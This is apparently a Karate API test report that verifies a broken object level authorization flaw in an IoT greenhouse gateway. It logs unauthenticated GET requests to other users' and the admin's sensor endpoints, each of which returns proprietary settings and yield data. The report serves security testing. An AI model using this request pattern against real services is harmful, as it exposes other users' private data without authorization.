{"failedCount":0,"prefixedPath":"classpath:ID_001_krtestoas_users_user_id_sensors_GET_verified.feature","packageQualifiedName":"ID_001_krtestoas_users_user_id_sensors_GET_verified","loopIndex":-1,"relativePath":"ID_001_krtestoas_users_user_id_sensors_GET_verified.feature","scenarioResults":[{"sectionIndex":0,"stepResults":[{"result":{"nanos":144800300,"startTime":1742993528134,"endTime":1742993528279,"millis":144.8003,"status":"passed"},"step":{"background":true,"line":4,"prefix":"*","index":0,"text":"url 'http:\/\/192.168.1.109:48080'"}},{"result":{"nanos":878100,"startTime":1742993528282,"endTime":1742993528283,"millis":0.8781,"status":"passed"},"step":{"comments":["# First access a legitimate user's sensors"],"line":8,"prefix":"Given","index":0,"text":"path '\/users\/user1\/sensors'"}},{"result":{"nanos":1663174500,"startTime":1742993528283,"endTime":1742993529946,"millis":1663.1745,"status":"passed"},"step":{"line":9,"prefix":"When","index":1,"text":"method get"},"stepLog":"14:52:09.653 request:\n1 > GET http:\/\/192.168.1.109:48080\/users\/user1\/sensors\n1 > Host: 192.168.1.109:48080\n1 > Connection: Keep-Alive\n1 > User-Agent: Apache-HttpClient\/4.5.14 (Java\/11.0.17)\n1 > Accept-Encoding: gzip,deflate\n\n\n14:52:09.744 response time in milliseconds: 79\n1 < 200\n1 < Content-Type: application\/json\n1 < Content-Length: 845\n1 < Server: Werkzeug\/2.0.1 Python\/3.9.21\n1 < Date: Wed, 26 Mar 2025 12:52:11 GMT\n{\"TEMP001\":{\"basic_data\":{\"confidence\":1.0,\"data_source\":\"minimal_format\",\"gateway_timestamp\":1742865408.562495,\"location\":\"greenhouse-1\",\"sensor_id\":\"TEMP001\",\"temperature\":24.139999389648438,\"timestamp\":1742865408,\"type\":\"temperature\",\"unit\":\"celsius\"},\"sensitive_data\":{\"alert_thresholds\":{\"high\":35.0,\"low\":15.0},\"proprietary_settings\":{\"growth_factor\":1.2,\"nutrient_mix\":\"formula-103\"},\"yield_prediction\":\"85.3 tons\/hectare\"}},\"TEMP002\":{\"basic_data\":{\"confidence\":1.0,\"data_source\":\"minimal_format\",\"gateway_timestamp\":1742865405.8499749,\"location\":\"unknown\",\"sensor_id\":\"TEMP002\",\"temperature\":24.32,\"timestamp\":1742865405.0,\"type\":\"unknown\",\"unit\":\"unknown\"},\"sensitive_data\":{\"alert_thresholds\":{\"high\":32.0,\"low\":18.0},\"proprietary_settings\":{\"growth_factor\":1.4,\"nutrient_mix\":\"formula-205\"},\"yield_prediction\":\"92.7 tons\/hectare\"}}}\n\n\n"},{"result":{"nanos":40500,"startTime":1742993529947,"endTime":1742993529947,"millis":0.0405,"status":"passed"},"step":{"line":10,"prefix":"Then","index":2,"text":"status 200"}},{"result":{"nanos":95945900,"startTime":1742993529947,"endTime":1742993530043,"millis":95.9459,"status":"passed"},"step":{"line":11,"prefix":"And","index":3,"text":"match response != null"}},{"result":{"nanos":32105400,"startTime":1742993530043,"endTime":1742993530075,"millis":32.1054,"status":"passed"},"step":{"line":12,"prefix":"And","index":4,"text":"match response['TEMP001'] != null"}},{"result":{"nanos":805100,"startTime":1742993530075,"endTime":1742993530076,"millis":0.8051,"status":"passed"},"step":{"comments":["# Then access another user's sensors (premium_user) without authentication"],"line":15,"prefix":"Given","index":5,"text":"path '\/users\/premium_user\/sensors'"}},{"result":{"nanos":21748100,"startTime":1742993530076,"endTime":1742993530098,"millis":21.7481,"status":"passed"},"step":{"line":16,"prefix":"When","index":6,"text":"method get"},"stepLog":"14:52:10.078 request:\n2 > GET http:\/\/192.168.1.109:48080\/users\/premium_user\/sensors\n2 > Host: 192.168.1.109:48080\n2 > Connection: Keep-Alive\n2 > User-Agent: Apache-HttpClient\/4.5.14 (Java\/11.0.17)\n2 > Accept-Encoding: gzip,deflate\n\n\n14:52:10.095 response time in milliseconds: 16\n2 < 200\n2 < Content-Type: application\/json\n2 < Content-Length: 480\n2 < Server: Werkzeug\/2.0.1 Python\/3.9.21\n2 < Date: Wed, 26 Mar 2025 12:52:11 GMT\n{\"TEMP004\":{\"basic_data\":{\"gateway_timestamp\":1742865407.0622792,\"sensor_id\":\"TEMP004\",\"temperature\":24.6,\"timestamp\":1742865407.0611646,\"unit\":\"celsius\"},\"sensitive_data\":{\"advanced_metrics\":{\"crop_stress_indicators\":[0.12,0.08,0.15],\"optimal_harvest_window\":\"2025-07-15 to 2025-07-25\",\"soil_health_index\":89.2},\"alert_thresholds\":{\"high\":34.0,\"low\":17.0},\"proprietary_settings\":{\"growth_factor\":1.8,\"nutrient_mix\":\"premium-formula-X\"},\"yield_prediction\":\"105.2 tons\/hectare\"}}}\n\n\n"},{"result":{"nanos":14000,"startTime":1742993530099,"endTime":1742993530099,"millis":0.014,"status":"passed"},"step":{"line":17,"prefix":"Then","index":7,"text":"status 200  # This SHOULD fail with 403 but doesn't due to the BOLA vulnerability"}},{"result":{"nanos":1334500,"startTime":1742993530099,"endTime":1742993530100,"millis":1.3345,"status":"passed"},"step":{"line":18,"prefix":"And","index":8,"text":"match response != null"}},{"result":{"nanos":4018500,"startTime":1742993530101,"endTime":1742993530105,"millis":4.0185,"status":"passed"},"step":{"line":19,"prefix":"And","index":9,"text":"match response['TEMP004'] != null"}},{"result":{"nanos":3934700,"startTime":1742993530105,"endTime":1742993530109,"millis":3.9347,"status":"passed"},"step":{"line":20,"prefix":"And","index":10,"text":"match response['TEMP004'].sensitive_data != null"}},{"result":{"nanos":5490200,"startTime":1742993530110,"endTime":1742993530115,"millis":5.4902,"status":"passed"},"step":{"line":21,"prefix":"And","index":11,"text":"match response['TEMP004'].sensitive_data.proprietary_settings != null"}},{"result":{"nanos":1223100,"startTime":1742993530115,"endTime":1742993530116,"millis":1.2231,"status":"passed"},"step":{"comments":["# Verify we can access admin user's sensors too (this demonstrates the vulnerability)"],"line":24,"prefix":"Given","index":12,"text":"path '\/users\/admin\/sensors'"}},{"result":{"nanos":40580000,"startTime":1742993530117,"endTime":1742993530158,"millis":40.58,"status":"passed"},"step":{"line":25,"prefix":"When","index":13,"text":"method get"},"stepLog":"14:52:10.125 request:\n3 > GET http:\/\/192.168.1.109:48080\/users\/admin\/sensors\n3 > Host: 192.168.1.109:48080\n3 > Connection: Keep-Alive\n3 > User-Agent: Apache-HttpClient\/4.5.14 (Java\/11.0.17)\n3 > Accept-Encoding: gzip,deflate\n\n\n14:52:10.150 response time in milliseconds: 22\n3 < 200\n3 < Content-Type: application\/json\n3 < Content-Length: 1323\n3 < Server: Werkzeug\/2.0.1 Python\/3.9.21\n3 < Date: Wed, 26 Mar 2025 12:52:11 GMT\n{\"TEMP001\":{\"basic_data\":{\"confidence\":1.0,\"data_source\":\"minimal_format\",\"gateway_timestamp\":1742865408.562495,\"location\":\"greenhouse-1\",\"sensor_id\":\"TEMP001\",\"temperature\":24.139999389648438,\"timestamp\":1742865408,\"type\":\"temperature\",\"unit\":\"celsius\"},\"sensitive_data\":{\"alert_thresholds\":{\"high\":35.0,\"low\":15.0},\"proprietary_settings\":{\"growth_factor\":1.2,\"nutrient_mix\":\"formula-103\"},\"yield_prediction\":\"85.3 tons\/hectare\"}},\"TEMP002\":{\"basic_data\":{\"confidence\":1.0,\"data_source\":\"minimal_format\",\"gateway_timestamp\":1742865405.8499749,\"location\":\"unknown\",\"sensor_id\":\"TEMP002\",\"temperature\":24.32,\"timestamp\":1742865405.0,\"type\":\"unknown\",\"unit\":\"unknown\"},\"sensitive_data\":{\"alert_thresholds\":{\"high\":32.0,\"low\":18.0},\"proprietary_settings\":{\"growth_factor\":1.4,\"nutrient_mix\":\"formula-205\"},\"yield_prediction\":\"92.7 tons\/hectare\"}},\"TEMP004\":{\"basic_data\":{\"gateway_timestamp\":1742865407.0622792,\"sensor_id\":\"TEMP004\",\"temperature\":24.6,\"timestamp\":1742865407.0611646,\"unit\":\"celsius\"},\"sensitive_data\":{\"advanced_metrics\":{\"crop_stress_indicators\":[0.12,0.08,0.15],\"optimal_harvest_window\":\"2025-07-15 to 2025-07-25\",\"soil_health_index\":89.2},\"alert_thresholds\":{\"high\":34.0,\"low\":17.0},\"proprietary_settings\":{\"growth_factor\":1.8,\"nutrient_mix\":\"premium-formula-X\"},\"yield_prediction\":\"105.2 tons\/hectare\"}}}\n\n\n"},{"result":{"nanos":20400,"startTime":1742993530157,"endTime":1742993530157,"millis":0.0204,"status":"passed"},"step":{"line":26,"prefix":"Then","index":14,"text":"status 200  # Again, should require authorization but doesn't"}},{"result":{"nanos":3619700,"startTime":1742993530158,"endTime":1742993530162,"millis":3.6197,"status":"passed"},"step":{"line":27,"prefix":"And","index":15,"text":"match response != null"}}],"executorName":"main","line":6,"name":"Verify access to other users' sensor data without proper authorization","description":"","durationMillis":2019.733,"startTime":1742993528106,"failed":false,"refId":"[1:6]","endTime":1742993530161,"exampleIndex":-1}],"callDepth":0,"name":"Test BOLA (Broken Object Level Authorization) vulnerability in IoT Gateway","description":"","resultDate":"2025-03-26 02:52:10 PM","durationMillis":2019.733,"passedCount":1}